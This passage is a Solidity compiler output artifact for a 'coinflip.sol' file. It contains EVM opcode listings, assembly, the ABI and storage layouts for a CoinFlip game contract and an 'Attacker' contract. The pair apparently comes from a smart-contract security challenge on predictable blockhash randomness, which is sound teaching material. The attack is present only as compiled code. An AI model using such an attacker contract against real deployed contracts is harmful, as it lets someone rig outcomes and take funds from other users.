											"end": 876,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 851,
											"end": 876,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 851,
											"end": 876,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 895,
											"end": 896,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 885,
											"end": 887,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 885,
											"end": 887,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 900,
											"end": 918,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 900,
											"end": 918,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 900,
											"end": 918,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 900,
											"end": 918,
											"name": "tag",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 900,
											"end": 918,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 885,
											"end": 887,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 885,
											"end": 887,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 942,
											"end": 943,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 939,
											"end": 940,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 935,
											"end": 944,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 930,
											"end": 944,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 930,
											"end": 944,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 807,
											"end": 950,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 807,
											"end": 950,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 807,
											"end": 950,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 807,
											"end": 950,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 807,
											"end": 950,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 956,
											"end": 1147,
											"name": "tag",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 956,
											"end": 1147,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 956,
											"end": 1147,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1016,
											"end": 1036,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 1034,
											"end": 1035,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1016,
											"end": 1036,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1016,
											"end": 1036,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1016,
											"end": 1036,
											"name": "tag",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 1016,
											"end": 1036,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1011,
											"end": 1036,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1011,
											"end": 1036,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1050,
											"end": 1070,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1068,
											"end": 1069,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1050,
											"end": 1070,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1050,
											"end": 1070,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1050,
											"end": 1070,
											"name": "tag",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1050,
											"end": 1070,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1045,
											"end": 1070,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1045,
											"end": 1070,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1089,
											"end": 1090,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1086,
											"end": 1087,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1083,
											"end": 1091,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 1080,
											"end": 1082,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1080,
											"end": 1082,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 1080,
											"end": 1082,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1094,
											"end": 1112,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 1094,
											"end": 1112,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 1094,
											"end": 1112,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1094,
											"end": 1112,
											"name": "tag",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 1094,
											"end": 1112,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1080,
											"end": 1082,
											"name": "tag",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 1080,
											"end": 1082,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1139,
											"end": 1140,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1136,
											"end": 1137,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1132,
											"end": 1141,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1124,
											"end": 1141,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1124,
											"end": 1141,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1001,
											"end": 1147,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1001,
											"end": 1147,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1001,
											"end": 1147,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1001,
											"end": 1147,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1001,
											"end": 1147,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1153,
											"end": 1243,
											"name": "tag",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 1153,
											"end": 1243,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1153,
											"end": 1243,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1230,
											"end": 1235,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1223,
											"end": 1236,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1216,
											"end": 1237,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1205,
											"end": 1237,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1205,
											"end": 1237,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1195,
											"end": 1243,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1195,
											"end": 1243,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1195,
											"end": 1243,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1195,
											"end": 1243,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1249,
											"end": 1326,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1249,
											"end": 1326,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1249,
											"end": 1326,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1315,
											"end": 1320,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1304,
											"end": 1320,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1304,
											"end": 1320,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1294,
											"end": 1326,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1294,
											"end": 1326,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1294,
											"end": 1326,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1294,
											"end": 1326,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1332,
											"end": 1512,
											"name": "tag",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 1332,
											"end": 1512,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1380,
											"end": 1457,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1377,
											"end": 1378,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1370,
											"end": 1458,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1477,
											"end": 1481,
											"name": "PUSH",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 1474,
											"end": 1475,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1467,
											"end": 1482,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1501,
											"end": 1505,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 1498,
											"end": 1499,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1491,
											"end": 1506,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1518,
											"end": 1698,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 1518,
											"end": 1698,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1566,
											"end": 1643,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1563,
											"end": 1564,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1556,
											"end": 1644,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1663,
											"end": 1667,
											"name": "PUSH",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 1660,
											"end": 1661,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1653,
											"end": 1668,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1687,
											"end": 1691,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 1684,
											"end": 1685,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1677,
											"end": 1692,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1704,
											"end": 1820,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 1704,
											"end": 1820,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1774,
											"end": 1795,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 1789,
											"end": 1794,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1774,
											"end": 1795,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 1774,
											"end": 1795,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1774,
											"end": 1795,
											"name": "tag",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 1774,
											"end": 1795,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1767,
											"end": 1772,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1764,
											"end": 1796,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 1754,
											"end": 1756,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1754,
											"end": 1756,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1810,
											"end": 1811,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1807,
											"end": 1808,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1800,
											"end": 1812,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1754,
											"end": 1756,
											"name": "tag",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1754,
											"end": 1756,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1744,
											"end": 1820,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1744,
											"end": 1820,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"flip()": "cde4efa9"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"flip\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/coinflip.sol\":\"Attacker\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/coinflip.sol\":{\"keccak256\":\"0xbb83f3b7ead7f152bb741ba583ec5e7a2805e7600da1ed55f601dbe55025e9d5\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8042d944a9b7a124fa99aa9dcdcccf17da3476a6cf026efd737742f22481540d\",\"dweb:/ipfs/QmV5Zsu19428ySnP4bn8Cn8VAvadRf62rf1R6eTs6Q4MDb\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 84,
								"contract": "contracts/coinflip.sol:Attacker",
								"label": "coinflip",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(CoinFlip)81"
							},
							{
								"astId": 86,
								"contract": "contracts/coinflip.sol:Attacker",
								"label": "lastHash",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 89,
								"contract": "contracts/coinflip.sol:Attacker",
								"label": "FACTOR",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_contract(CoinFlip)81": {
								"encoding": "inplace",
								"label": "contract CoinFlip",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"CoinFlip": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "consecutiveWins",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bool",
									"name": "_guess",
									"type": "bool"
								}
							],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/coinflip.sol\":60:826  contract CoinFlip {\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/coinflip.sol\":162:239  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/coinflip.sol\":145:239  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x02\n  sstore\n    /* \"contracts/coinflip.sol\":248:300  constructor() {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"contracts/coinflip.sol\":291:292  0 */\n  0x00\n    /* \"contracts/coinflip.sol\":273:288  consecutiveWins */\n  dup1\n    /* \"contracts/coinflip.sol\":273:292  consecutiveWins = 0 */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"contracts/coinflip.sol\":60:826  contract CoinFlip {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/coinflip.sol\":60:826  contract CoinFlip {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1d263f67\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xe6f334d7\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/coinflip.sol\":308:823  function flip(bool _guess) public returns (bool) {\r... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/coinflip.sol\":85:115  uint256 public consecutiveWins */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/coinflip.sol\":308:823  function flip(bool _guess) public returns (bool) {\r... */\n    tag_8:\n        /* \"contracts/coinflip.sol\":351:355  bool */\n      0x00\n        /* \"contracts/coinflip.sol\":368:386  uint256 blockValue */\n      dup1\n        /* \"contracts/coinflip.sol\":422:423  1 */\n      0x01\n        /* \"contracts/coinflip.sol\":407:419  block.number */\n      number\n        /* \"contracts/coinflip.sol\":407:423  block.number - 1 */\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n        /* \"contracts/coinflip.sol\":397:424  blockhash(block.number - 1) */\n      blockhash\n        /* \"contracts/coinflip.sol\":389:425  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"contracts/coinflip.sol\":368:425  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"contracts/coinflip.sol\":454:464  blockValue */\n      dup1\n        /* \"contracts/coinflip.sol\":442:450  lastHash */\n      sload(0x01)\n        /* \"contracts/coinflip.sol\":442:464  lastHash == blockValue */\n      eq\n        /* \"contracts/coinflip.sol\":438:501  if (lastHash == blockValue) {\r... */\n      iszero\n      tag_18\n      jumpi\n        /* \"contracts/coinflip.sol\":481:489  revert() */\n      0x00\n      dup1\n      revert\n        /* \"contracts/coinflip.sol\":438:501  if (lastHash == blockValue) {\r... */\n    tag_18:\n        /* \"contracts/coinflip.sol\":524:534  blockValue */\n      dup1\n        /* \"contracts/coinflip.sol\":513:521  lastHash */\n      0x01\n        /* \"contracts/coinflip.sol\":513:534  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/coinflip.sol\":545:561  uint256 coinFlip */\n      0x00\n        /* \"contracts/coinflip.sol\":577:583  FACTOR */\n      sload(0x02)\n        /* \"contracts/coinflip.sol\":564:574  blockValue */\n      dup3\n        /* \"contracts/coinflip.sol\":564:583  blockValue / FACTOR */\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"contracts/coinflip.sol\":545:583  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"contracts/coinflip.sol\":594:603  bool side */\n      0x00\n        /* \"contracts/coinflip.sol\":618:619  1 */\n      0x01\n        /* \"contracts/coinflip.sol\":606:614  coinFlip */\n      dup3\n        /* \"contracts/coinflip.sol\":606:619  coinFlip == 1 */\n      eq\n        /* \"contracts/coinflip.sol\":606:634  coinFlip == 1 ? true : false */\n      tag_21\n      jumpi\n        /* \"contracts/coinflip.sol\":629:634  false */\n      0x00\n        /* \"contracts/coinflip.sol\":606:634  coinFlip == 1 ? true : false */\n      jump(tag_22)\n    tag_21:\n        /* \"contracts/coinflip.sol\":622:626  true */\n      0x01\n        /* \"contracts/coinflip.sol\":606:634  coinFlip == 1 ? true : false */\n    tag_22:\n        /* \"contracts/coinflip.sol\":594:634  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contracts/coinflip.sol\":659:665  _guess */\n      dup5\n        /* \"contracts/coinflip.sol\":651:665  side == _guess */\n      iszero\n      iszero\n        /* \"contracts/coinflip.sol\":651:655  side */\n      dup2\n        /* \"contracts/coinflip.sol\":651:665  side == _guess */\n      iszero\n      iszero\n      eq\n        /* \"contracts/coinflip.sol\":647:816  if (side == _guess) {\r... */\n      iszero\n      tag_23\n      jumpi\n        /* \"contracts/coinflip.sol\":682:697  consecutiveWins */\n      0x00\n      dup1\n        /* \"contracts/coinflip.sol\":682:699  consecutiveWins++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_24\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"contracts/coinflip.sol\":721:725  true */\n      0x01\n        /* \"contracts/coinflip.sol\":714:725  return true */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump(tag_15)\n        /* \"contracts/coinflip.sol\":647:816  if (side == _guess) {\r... */\n    tag_23:\n        /* \"contracts/coinflip.sol\":776:777  0 */\n      0x00\n        /* \"contracts/coinflip.sol\":758:773  consecutiveWins */\n      dup1\n        /* \"contracts/coinflip.sol\":758:777  consecutiveWins = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/coinflip.sol\":799:804  false */\n      0x00\n        /* \"contracts/coinflip.sol\":792:804  return false */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/coinflip.sol\":308:823  function flip(bool _guess) public returns (bool) {\r... */\n    tag_15:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/coinflip.sol\":85:115  uint256 public consecutiveWins */\n    tag_12:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:140   */\n    tag_28:\n      0x00\n        /* \"#utility.yul\":88:94   */\n      dup2\n        /* \"#utility.yul\":75:95   */\n      calldataload\n        /* \"#utility.yul\":66:95   */\n      swap1\n      pop\n        /* \"#utility.yul\":104:134   */\n      tag_30\n        /* \"#utility.yul\":128:133   */\n      dup2\n        /* \"#utility.yul\":104:134   */\n      tag_31\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":56:140   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":146:402   */\n    tag_7:\n      0x00\n        /* \"#utility.yul\":251:253   */\n      0x20\n        /* \"#utility.yul\":239:248   */\n      dup3\n        /* \"#utility.yul\":230:237   */\n      dup5\n        /* \"#utility.yul\":226:249   */\n      sub\n        /* \"#utility.yul\":222:254   */\n      slt\n        /* \"#utility.yul\":219:221   */\n      iszero\n      tag_33\n      jumpi\n        /* \"#utility.yul\":267:268   */\n      0x00\n        /* \"#utility.yul\":264:265   */\n      dup1\n        /* \"#utility.yul\":257:269   */\n      revert\n        /* \"#utility.yul\":219:221   */\n    tag_33:\n        /* \"#utility.yul\":310:311   */\n      0x00\n        /* \"#utility.yul\":335:385   */\n      tag_34\n        /* \"#utility.yul\":377:384   */\n      dup5\n        /* \"#utility.yul\":368:374   */\n      dup3\n        /* \"#utility.yul\":357:366   */\n      dup6\n        /* \"#utility.yul\":353:375   */\n      add\n        /* \"#utility.yul\":335:385   */\n      tag_28\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":325:385   */\n      swap2\n      pop\n        /* \"#utility.yul\":281:395   */\n      pop\n        /* \"#utility.yul\":209:402   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":408:517   */\n    tag_35:\n        /* \"#utility.yul\":489:510   */\n      tag_37\n        /* \"#utility.yul\":504:509   */\n      dup2\n        /* \"#utility.yul\":489:510   */\n      tag_38\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":484:487   */\n      dup3\n        /* \"#utility.yul\":477:511   */\n      mstore\n        /* \"#utility.yul\":467:517   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":523:641   */\n    tag_39:\n        /* \"#utility.yul\":610:634   */\n      tag_41\n        /* \"#utility.yul\":628:633   */\n      dup2\n        /* \"#utility.yul\":610:634   */\n      tag_42\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":605:608   */\n      dup3\n        /* \"#utility.yul\":598:635   */\n      mstore\n        /* \"#utility.yul\":588:641   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":647:857   */\n    tag_10:\n      0x00\n        /* \"#utility.yul\":772:774   */\n      0x20\n        /* \"#utility.yul\":761:770   */\n      dup3\n        /* \"#utility.yul\":757:775   */\n      add\n        /* \"#utility.yul\":749:775   */\n      swap1\n      pop\n        /* \"#utility.yul\":785:850   */\n      tag_44\n        /* \"#utility.yul\":847:848   */\n      0x00\n        /* \"#utility.yul\":836:845   */\n      dup4\n        /* \"#utility.yul\":832:849   */\n      add\n        /* \"#utility.yul\":823:829   */\n      dup5\n        /* \"#utility.yul\":785:850   */\n      tag_35\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":739:857   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":863:1085   */\n    tag_14:\n      0x00\n        /* \"#utility.yul\":994:996   */\n      0x20\n        /* \"#utility.yul\":983:992   */\n      dup3\n        /* \"#utility.yul\":979:997   */\n      add\n        /* \"#utility.yul\":971:997   */\n      swap1\n      pop\n        /* \"#utility.yul\":1007:1078   */\n      tag_46\n        /* \"#utility.yul\":1075:1076   */\n      0x00\n        /* \"#utility.yul\":1064:1073   */\n      dup4\n        /* \"#utility.yul\":1060:1077   */\n      add\n        /* \"#utility.yul\":1051:1057   */\n      dup5\n        /* \"#utility.yul\":1007:1078   */\n      tag_39\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":961:1085   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1091:1276   */\n    tag_20:\n      0x00\n        /* \"#utility.yul\":1148:1168   */\n      tag_48\n        /* \"#utility.yul\":1166:1167   */\n      dup3\n        /* \"#utility.yul\":1148:1168   */\n      tag_42\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":1143:1168   */\n      swap2\n      pop\n        /* \"#utility.yul\":1182:1202   */\n      tag_49\n        /* \"#utility.yul\":1200:1201   */\n      dup4\n        /* \"#utility.yul\":1182:1202   */\n      tag_42\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":1177:1202   */\n      swap3\n      pop\n        /* \"#utility.yul\":1221:1222   */\n      dup3\n        /* \"#utility.yul\":1211:1213   */\n      tag_50\n      jumpi\n        /* \"#utility.yul\":1226:1244   */\n      tag_51\n      tag_52\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":1211:1213   */\n    tag_50:\n        /* \"#utility.yul\":1268:1269   */\n      dup3\n        /* \"#utility.yul\":1265:1266   */\n      dup3\n        /* \"#utility.yul\":1261:1270   */\n      div\n        /* \"#utility.yul\":1256:1270   */\n      swap1\n      pop\n        /* \"#utility.yul\":1133:1276   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1282:1473   */\n    tag_17:\n      0x00\n        /* \"#utility.yul\":1342:1362   */\n      tag_54\n        /* \"#utility.yul\":1360:1361   */\n      dup3\n        /* \"#utility.yul\":1342:1362   */\n      tag_42\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1337:1362   */\n      swap2\n      pop\n        /* \"#utility.yul\":1376:1396   */\n      tag_55\n        /* \"#utility.yul\":1394:1395   */\n      dup4\n        /* \"#utility.yul\":1376:1396   */\n      tag_42\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1371:1396   */\n      swap3\n      pop\n        /* \"#utility.yul\":1415:1416   */\n      dup3\n        /* \"#utility.yul\":1412:1413   */\n      dup3\n        /* \"#utility.yul\":1409:1417   */\n      lt\n        /* \"#utility.yul\":1406:1408   */\n      iszero\n      tag_56\n      jumpi\n        /* \"#utility.yul\":1420:1438   */\n      tag_57\n      tag_58\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":1406:1408   */\n    tag_56:\n        /* \"#utility.yul\":1465:1466   */\n      dup3\n        /* \"#utility.yul\":1462:1463   */\n      dup3\n        /* \"#utility.yul\":1458:1467   */\n      sub\n        /* \"#utility.yul\":1450:1467   */\n      swap1\n      pop\n        /* \"#utility.yul\":1327:1473   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1479:1569   */\n    tag_38:\n      0x00\n        /* \"#utility.yul\":1556:1561   */\n      dup2\n        /* \"#utility.yul\":1549:1562   */\n      iszero\n        /* \"#utility.yul\":1542:1563   */\n      iszero\n        /* \"#utility.yul\":1531:1563   */\n      swap1\n      pop\n        /* \"#utility.yul\":1521:1569   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1575:1652   */\n    tag_42:\n      0x00\n        /* \"#utility.yul\":1641:1646   */\n      dup2\n        /* \"#utility.yul\":1630:1646   */\n      swap1\n      pop\n        /* \"#utility.yul\":1620:1652   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1658:1891   */\n    tag_25:\n      0x00\n        /* \"#utility.yul\":1720:1744   */\n      tag_62\n        /* \"#utility.yul\":1738:1743   */\n      dup3\n        /* \"#utility.yul\":1720:1744   */\n      tag_42\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":1711:1744   */\n      swap2\n      pop\n        /* 